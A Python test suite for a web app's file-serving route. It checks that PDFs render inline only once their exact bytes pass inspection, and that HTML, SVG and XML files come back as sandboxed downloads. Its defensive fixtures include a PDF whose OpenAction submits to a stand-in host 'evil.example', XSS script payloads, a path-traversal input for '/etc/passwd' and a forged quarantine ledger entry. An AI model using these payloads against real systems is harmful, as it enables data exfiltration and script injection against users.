"""A PDF is rendered by the browser only if its exact bytes were inspected clean.

Before this, the blob route decided by path and suffix: any ``.pdf`` outside
``retrieved/`` went to the browser as ``application/pdf``, inline. A PDF that
arrived by commit, pull, import or pipeline stage never met quarantine, and the
browser's viewer is exactly what an ``/OpenAction`` is written for.
"""

from __future__ import annotations

import subprocess

import pytest
from conftest import init_body

from blpl.core import av, quarantine

BENIGN = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)
PHONES_HOME = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction"
    b"<</S/SubmitForm/F(https://evil.example/x)>>>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)


@pytest.fixture(autouse=True)
def _clean_scanner(monkeypatch):
    """A scanner that answers clean, so "clean" is reachable at all.

    Without one every inspected PDF is ``unscanned``, which is never inline;
    the tests that need that say so by removing it.
    """
    monkeypatch.delenv("BLPL_QUARANTINE_REQUIRE_SCAN", raising=False)
    monkeypatch.setattr(
        quarantine.av, "scan_bytes", lambda data: av.ScanResult(state="clean", scanner="test")
    )


def _project(client, name="scratch"):
    import app.main as main

    client.post("/api/projects/init", json=init_body(name))
    return main.PROJECTS_ROOT / name


def _commit(proj, rel, data):
    """Put a file in the project the way a pull or a member's commit does."""
    target = proj / rel
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_bytes(data)
    env = {"GIT_AUTHOR_NAME": "x", "GIT_AUTHOR_EMAIL": "x@example.com",
           "GIT_COMMITTER_NAME": "x", "GIT_COMMITTER_EMAIL": "x@example.com"}
    import os

    subprocess.run(["git", "add", rel], cwd=proj, check=True)
    subprocess.run(["git", "commit", "-qm", "add"], cwd=proj, check=True, env={**os.environ, **env})


def _blob(client, path, name="scratch"):
    return client.get(f"/api/projects/{name}/blob", params={"path": path})


def _inline(r) -> bool:
    return (
        r.headers["content-type"] == "application/pdf"
        and r.headers["content-disposition"].startswith("inline")
    )


def _opaque(r) -> bool:
    return (
        r.headers["content-type"] == "application/octet-stream"
        and r.headers["content-disposition"].startswith("attachment")
        and r.headers["x-content-type-options"] == "nosniff"
        and "sandbox" in r.headers.get("content-security-policy", "")
    )


def test_an_uninspected_pdf_committed_into_a_project_is_not_served_inline(unlocked):
    proj = _project(unlocked)
    _commit(proj, "datasheets/TPS62840.pdf", BENIGN)
    r = _blob(unlocked, "datasheets/TPS62840.pdf")
    assert r.status_code == 200
    assert _opaque(r) and not _inline(r)
    assert r.headers["x-blpl-pdf-verdict"] == "none"
    # Still the file: a download, not a refusal.
    assert r.content == BENIGN


def test_after_inspection_it_is(unlocked):
    proj = _project(unlocked)
    _commit(proj, "datasheets/TPS62840.pdf", BENIGN)
    before = unlocked.get("/api/projects/scratch/blob/verdict", params={"path": "datasheets/TPS62840.pdf"}).json()
    assert before["pdf"] is True and before["verdict"] is None and before["inline"] is False

    r = unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "datasheets/TPS62840.pdf"})
    assert r.status_code == 200, r.text
    assert r.json()["verdict"] == "clean" and r.json()["inline"] is True

    served = _blob(unlocked, "datasheets/TPS62840.pdf")
    assert _inline(served)
    assert served.content == BENIGN


def test_a_held_pdf_is_never_inline(unlocked):
    proj = _project(unlocked)
    _commit(proj, "evil.pdf", PHONES_HOME)
    r = unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "evil.pdf"})
    body = r.json()
    assert body["verdict"] == "held" and body["inline"] is False
    assert any("OpenAction" in reason or "open" in reason for reason in body["reasons"]), body["reasons"]
    served = _blob(unlocked, "evil.pdf")
    assert _opaque(served)
    assert served.headers["x-blpl-pdf-verdict"] == "held"


def test_content_changed_after_inspection_is_not_inline(unlocked):
    """The verdict belongs to the bytes. New bytes at the same path have none."""
    proj = _project(unlocked)
    _commit(proj, "datasheets/X.pdf", BENIGN)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "datasheets/X.pdf"})
    assert _inline(_blob(unlocked, "datasheets/X.pdf"))

    (proj / "datasheets/X.pdf").write_bytes(PHONES_HOME)
    r = _blob(unlocked, "datasheets/X.pdf")
    assert _opaque(r)
    assert r.headers["x-blpl-pdf-verdict"] == "none"


def test_a_renamed_or_copied_clean_pdf_keeps_its_verdict(unlocked):
    """The other side of trusting bytes: moving a file sheds nothing."""
    proj = _project(unlocked)
    _commit(proj, "a.pdf", BENIGN)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "a.pdf"})
    (proj / "boards").mkdir()
    (proj / "boards" / "copy.pdf").write_bytes(BENIGN)
    assert _inline(_blob(unlocked, "boards/copy.pdf"))


def test_a_pdf_is_recognised_by_its_bytes_not_its_name(unlocked):
    proj = _project(unlocked)
    _commit(proj, "notes.txt", b"\n" + PHONES_HOME)
    r = _blob(unlocked, "notes.txt")
    assert _opaque(r)
    # And a file only *named* .pdf is not handed to the viewer either.
    _commit(proj, "fake.pdf", b"<html><script>alert(1)</script></html>")
    fake = _blob(unlocked, "fake.pdf")
    assert fake.headers["content-type"] == "application/octet-stream"
    assert fake.headers["content-disposition"].startswith("attachment")


def test_an_unscanned_pdf_is_not_clean_enough_to_render(unlocked, monkeypatch):
    monkeypatch.setattr(
        quarantine.av, "scan_bytes", lambda data: av.ScanResult(state="unscanned", detail="none")
    )
    proj = _project(unlocked)
    _commit(proj, "a.pdf", BENIGN)
    body = unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "a.pdf"}).json()
    assert body["verdict"] == "unscanned" and body["inline"] is False
    assert _opaque(_blob(unlocked, "a.pdf"))


def test_a_clean_verdict_from_another_inspector_does_not_count(unlocked):
    import app.db
    from app.models import PdfVerdict

    proj = _project(unlocked)
    _commit(proj, "a.pdf", BENIGN)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "a.pdf"})
    with app.db.SessionFactory() as s:
        row = s.query(PdfVerdict).one()
        row.inspector = "pdf_inspect/0"
        s.commit()
    assert _opaque(_blob(unlocked, "a.pdf"))


def test_a_ledger_row_saying_released_is_not_taken_on_its_word(unlocked):
    """The ledger is committed, so a pull can bring in any claim."""
    import json

    proj = _project(unlocked)
    import hashlib

    sha = hashlib.sha256(PHONES_HOME).hexdigest()
    ledger = quarantine.quarantine_dir(proj) / quarantine.LEDGER_NAME
    ledger.parent.mkdir(parents=True, exist_ok=True)
    ledger.write_text(json.dumps({"schema_version": 1, "retrieved": [{
        "sha256": sha, "filename": "x.pdf", "bytes": 1, "state": "released",
        "inspector": quarantine.INSPECTOR,
        "inspection": {"state": "inspected"}, "scan": {"state": "clean"}, "reasons": [],
    }]}))
    _commit(proj, "datasheets/forged.pdf", PHONES_HOME)
    assert _opaque(_blob(unlocked, "datasheets/forged.pdf"))


def test_a_ledger_row_saying_held_is_shown_before_any_download(unlocked):
    import hashlib
    import json

    proj = _project(unlocked)
    sha = hashlib.sha256(BENIGN).hexdigest()
    ledger = quarantine.quarantine_dir(proj) / quarantine.LEDGER_NAME
    ledger.parent.mkdir(parents=True, exist_ok=True)
    ledger.write_text(json.dumps({"schema_version": 1, "retrieved": [{
        "sha256": sha, "filename": "x.pdf", "bytes": 1, "state": "held",
        "inspection": {"state": "inspected"}, "scan": {"state": "infected"},
        "reasons": ["a malware scanner matched Test"],
    }]}))
    _commit(proj, "copied.pdf", BENIGN)
    v = unlocked.get("/api/projects/scratch/blob/verdict", params={"path": "copied.pdf"}).json()
    assert v["verdict"] == "held" and v["reasons"] == ["a malware scanner matched Test"]
    assert v["source"] == "ledger"
    assert _opaque(_blob(unlocked, "copied.pdf"))


def test_an_upload_records_its_verdict_so_a_clean_one_opens(unlocked):
    _project(unlocked)
    import json

    r = unlocked.post(
        "/api/projects/scratch/uploads",
        files=[("files", ("guide.pdf", BENIGN, "application/pdf"))],
        data={"meta": json.dumps([{"kind": "reference"}])},
    )
    path = r.json()["results"][0]["path"]
    assert _inline(_blob(unlocked, path))


def test_a_retrieved_file_stays_a_download_even_when_clean(unlocked):
    proj = _project(unlocked)
    qdir = quarantine.quarantine_dir(proj)
    qdir.mkdir(parents=True, exist_ok=True)
    (qdir / "abc-X.pdf").write_bytes(BENIGN)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "retrieved/abc-X.pdf"})
    r = _blob(unlocked, "retrieved/abc-X.pdf")
    assert r.headers["content-type"] == "application/octet-stream"
    v = unlocked.get("/api/projects/scratch/blob/verdict", params={"path": "retrieved/abc-X.pdf"}).json()
    assert v["inline"] is False


def test_a_pdf_over_the_limit_is_never_judged_or_inline(unlocked, monkeypatch):
    import app.main as main

    proj = _project(unlocked)
    _commit(proj, "big.pdf", BENIGN)
    monkeypatch.setattr(main, "UPLOAD_MAX_BYTES", 16)
    assert _opaque(_blob(unlocked, "big.pdf"))
    assert unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "big.pdf"}).status_code == 413


def test_only_pdfs_are_inspected(unlocked):
    proj = _project(unlocked)
    _commit(proj, "notes.md", b"# hi\n")
    assert unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "notes.md"}).status_code == 400


def test_inspecting_does_not_reach_outside_the_project(unlocked):
    _project(unlocked)
    r = unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "../../etc/passwd"})
    assert r.status_code in (400, 404)


def test_a_verdict_in_one_project_does_not_vouch_for_another(unlocked):
    a = _project(unlocked, "one")
    b = _project(unlocked, "two")
    _commit(a, "x.pdf", BENIGN)
    _commit(b, "x.pdf", BENIGN)
    unlocked.post("/api/projects/one/blob/inspect", json={"path": "x.pdf"})
    assert _inline(_blob(unlocked, "x.pdf", "one"))
    assert _opaque(_blob(unlocked, "x.pdf", "two"))


@pytest.mark.parametrize("name,data", [
    ("page.html", b"<script>fetch('/api/projects')</script>"),
    ("logo.svg", b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"),
    ("thing.xml", b"<?xml version='1.0'?><x:script xmlns:x='http://www.w3.org/1999/xhtml'>alert(1)</x:script>"),
    ("page.xhtml", b"<html xmlns='http://www.w3.org/1999/xhtml'><script>alert(1)</script></html>"),
])
def test_active_types_committed_into_a_project_are_inert_downloads(unlocked, name, data):
    proj = _project(unlocked)
    _commit(proj, name, data)
    r = _blob(unlocked, name)
    assert r.headers["content-type"] == "application/octet-stream"
    assert r.headers["content-disposition"].startswith("attachment")
    assert r.headers["x-content-type-options"] == "nosniff"
    assert "sandbox" in r.headers["content-security-policy"]


def test_text_and_images_still_display_but_cannot_run(unlocked):
    proj = _project(unlocked)
    _commit(proj, "notes.md", b"<script>alert(1)</script>\n")
    _commit(proj, "shot.png", b"<svg onload=alert(1)>")
    md = _blob(unlocked, "notes.md")
    assert md.headers["content-type"].startswith("text/plain")
    assert "sandbox" in md.headers["content-security-policy"]
    png = _blob(unlocked, "shot.png")
    assert png.headers["content-type"] == "image/png"
    assert png.headers["x-content-type-options"] == "nosniff"


def test_a_filename_cannot_inject_a_header(unlocked):
    proj = _project(unlocked)
    (proj / 'a"b.md').write_bytes(b"x")
    r = _blob(unlocked, 'a"b.md')
    assert r.status_code == 200
    assert r.headers["content-disposition"] == "inline; filename*=utf-8''a%22b.md"


def test_a_chat_attachment_pdf_follows_the_same_rule(unlocked, monkeypatch):
    _project(unlocked)
    conv = unlocked.post("/api/projects/scratch/conversations", json={"title": "t"}).json()["filename"]
    att = unlocked.post(
        f"/api/projects/scratch/conversations/{conv}/attachments",
        files=[("files", ("a.pdf", BENIGN, "application/pdf"))],
    ).json()[0]
    r = unlocked.get(f"/api/projects/scratch/attachments/{att['id']}")
    assert _inline(r)

    # Attached where no scanner ran: kept for the model, but not rendered.
    monkeypatch.setattr(
        quarantine.av, "scan_bytes", lambda data: av.ScanResult(state="unscanned", detail="none")
    )
    other = BENIGN + b"%other\n"
    att2 = unlocked.post(
        f"/api/projects/scratch/conversations/{conv}/attachments",
        files=[("files", ("b.pdf", other, "application/pdf"))],
    ).json()[0]
    r2 = unlocked.get(f"/api/projects/scratch/attachments/{att2['id']}")
    assert _opaque(r2)
    assert r2.content == other


def test_every_api_response_says_nosniff(unlocked):
    _project(unlocked)
    r = unlocked.get("/api/projects/scratch/tree")
    assert r.headers["x-content-type-options"] == "nosniff"
